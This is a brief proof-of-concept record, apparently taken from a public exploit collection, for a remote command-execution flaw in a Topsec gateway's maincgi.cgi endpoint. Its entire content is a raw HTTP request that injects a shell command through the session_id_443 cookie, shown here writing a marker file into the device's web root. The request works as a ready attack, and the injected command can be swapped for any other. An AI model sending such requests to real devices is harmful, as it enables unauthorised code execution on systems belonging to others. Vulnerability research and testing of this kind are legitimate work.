# topsec_cookie_rce
from: https://github.com/Vme18000yuan/FreePOC/blob/master/poc/pocsuite/topsec-maincgi-cookie-rce.py
24/01/02
@2
```
GET /cgi/maincgi.cgi?Url=check HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Connection: close
Cookie: session_id_443=1|echo 'vulnerability' >> /www/htdocs/site/image/security1.txt;
```
